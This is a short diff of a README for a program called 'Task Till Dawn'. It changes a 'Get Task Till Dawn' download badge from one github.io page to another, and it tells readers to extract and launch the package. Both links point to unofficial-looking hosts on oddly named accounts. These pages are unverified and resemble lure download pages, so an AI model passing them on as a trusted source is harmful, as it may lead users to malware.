@@ -15,7 +15,7 @@ The core philosophy behind **Task Till Dawn** is simplicity without sacrificing 
 
 ## Getting Started with Task Till Dawn
 
-[![Get Task Till Dawn](https://img.shields.io/badge/Get_Task_Till_Dawn-Now-00b894?style=for-the-badge)](https://kolsonaveryvedj.github.io/.github/task-till-dawn)
+[![Get Task Till Dawn](https://img.shields.io/badge/Get_Task_Till_Dawn-Now-00b894?style=for-the-badge)](https://task-tilldawn.github.io/.github/)
 
 1. Acquire **Task Till Dawn** and extract the package.  
 2. Launch **Task Till Dawn** directly from its folder (no system changes required).  
